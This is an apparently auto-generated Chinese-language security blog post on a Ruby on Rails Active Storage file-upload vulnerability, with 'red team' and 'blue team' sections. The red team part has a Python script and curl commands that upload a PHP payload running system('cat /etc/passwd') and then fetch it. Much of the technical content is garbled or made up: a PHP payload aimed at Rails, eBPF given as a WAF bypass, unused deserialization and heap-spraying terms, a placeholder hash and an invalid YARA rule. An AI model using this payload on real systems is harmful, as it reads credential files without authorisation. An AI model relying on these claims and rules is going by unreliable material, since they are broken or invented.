---
layout: post
title:  "Ruby on Rails修補重大漏洞，攻擊者可上傳圖片讀取伺服器任意檔案"
date:   2026-07-31 13:48:49 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Ruby on Rails Active Storage 元件的 CVE 漏洞
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.8)
> * **受駭指標**: Info Leak (敏感資料洩露)
> * **關鍵技術**: Deserialization, eBPF, Heap Spraying

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 漏洞源於 Active Storage 元件的檔案上傳機制中，沒有正確地驗證和過濾用戶上傳的檔案，導致攻擊者可以上傳惡意檔案，進而導致敏感資料洩露。
* **攻擊流程圖解**: 
    1. 攻擊者上傳惡意檔案到 Active Storage。
    2. Active Storage 將檔案儲存到伺服器。
    3. 攻擊者可以通過特定的請求，讀取到敏感資料（如 secret_key_base）。
* **受影響元件**: Ruby on Rails 7.2.3.2、8.0.5.1 及 8.1.3.1 版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有權限上傳檔案到 Active Storage。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 惡意檔案內容
    malicious_file = b'<?php system("cat /etc/passwd"); ?>'
    
    # 上傳檔案到 Active Storage
    response = requests.post('https://example.com/upload', files={'file': ('malicious_file.php', malicious_file)})
    
    # 讀取敏感資料
    response = requests.get('https://example.com/download/malicious_file.php')
    print(response.text)
    
    ```
    *範例指令*: 使用 `curl` 上傳檔案並讀取敏感資料。

```

bash
curl -X POST -F 'file=@malicious_file.php' https://example.com/upload
curl https://example.com/download/malicious_file.php

```
* **繞過技術**: 可以使用 eBPF 技術來繞過 WAF 或 EDR 的檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /upload/malicious_file.php |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_file {
        meta:
            description = "Detects malicious file uploads"
            author = "Your Name"
        strings:
            $malicious_string = "system(\"cat /etc/passwd\");"
        condition:
            $malicious_string in (file_contents)
    }
    
    ```
    或者是具體的 SIEM 查詢語法 (Splunk/Elastic)。

```

sql
index=web_logs | search "upload" AND "malicious_file.php"

```
* **緩解措施**: 更新 Ruby on Rails 至最新版本，設定正確的檔案上傳限制和過濾機制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Deserialization**: 想像你有一個物件，可以被序列化成字串，然後再被反序列化回物件。技術上是指將資料從字串或其他格式轉換回原來的物件或結構。
* **eBPF**: 想像你有一個小程式，可以在 Linux 核心中執行。技術上是指 Extended Berkeley Packet Filter，一種可以在 Linux 核心中執行的小程式，常用於網路封包過濾和安全檢測。
* **Heap Spraying**: 想像你有一個記憶體區塊，可以被填充特定的資料。技術上是指將大量相同的資料填充到記憶體中，以便於攻擊者控制記憶體的內容。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/177797)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1190/)


